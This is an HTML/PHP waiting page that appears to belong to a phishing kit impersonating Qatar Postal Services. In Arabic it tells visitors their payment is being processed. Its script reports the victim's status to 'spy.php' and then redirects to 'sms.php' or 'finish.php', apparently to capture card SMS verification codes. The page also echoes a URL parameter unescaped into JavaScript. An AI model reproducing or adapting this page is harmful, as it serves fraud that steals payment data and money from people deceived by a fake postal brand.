<!doctype html>
<html>
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width">
<meta name="robots" content="nofollow,noindex">
<title>Qatar Postal Services</title>
<link rel="stylesheet" href="inc/style.css">
<link rel="icon" href="inc/icon.ico">
</head>
<body>
<div class="header">
<div class="left">
<img src="inc/menu.png">
</div>
<div class="right">
<img src="inc/logo.png">
</div>
</div>
<div style="text-align:center;">
<div class="form">

<div class="formcol">
<h2>تتم معالجة طلبكم...</h2>
<img src="inc/loader.gif" style="width:50px;">
<p>المرجو عدم القيام بغلق أو إعادة تحميل الصفحة لتجنب الدفع المتكرر.</p>
</div>

</div>
</div>


<div class="footer">
<div class="f-side">
<div class="f-col">
<p>كيف يمكننا مساعدتك</p>
<span>الأسئلة الشائعة</span>
<span>المواد المحظورة</span>
<span>المعايير البريدية</span>
<span>فيديوهات</span>
</div>
<div class="f-col">
<p>حول بريد قطر</p>
<span>الرؤية و الرسالة و الأهداف</span>
<span>تاريخ بريد قطر</span>
<span>أخبار</span>
<span>الفروع وساعات العمل</span>
<span>الوظائف</span>
</div>
</div>
<div class="f-side">
<div class="f-col">
<p>خط التواصل</p>
<span>info@qatarposts.com</span>
<span>الخط الساخن 104</span>
<span>تابعونا</span>
<img src="inc/social.png" style="width:120px;">
</div>
<div class="f-col">
<p>سياسات</p>
<span>سياسة الخصوصية</span>
<span>السياسة العامة لأمن المعلومات</span>
<span>الشروط والأحكام</span>
<span>سياسة نظام الإدارة المتكامل</span>
</div>
</div>
<div class="f-side">
<div class="f-col">
<p>حمل التطبيق</p>
<img src="inc/android.png" style="width:70px;">
<img src="inc/apple.png" style="width:70px;">
</div>
<div class="f-col">
<img src="inc/bv.jpg" style="width:160px;">
</div>

</div>
</div>
<script src="inc/jq.js"></script>
<script>
$.post("spy.php",{waiting:1});


var uri = "<?php echo @$_GET['p']; ?>";
var target = "sms.php";
switch(uri){
	case 'sms':
	target = "sms.php";
	break;
	
	case 'sms_error':
	target = "sms.php?e";
	break;
	
	case 'finish':
	target = "finish.php";
	break;
}


setTimeout(function(){
window.location=target;
}, 20000);

</script>
</body>
</html>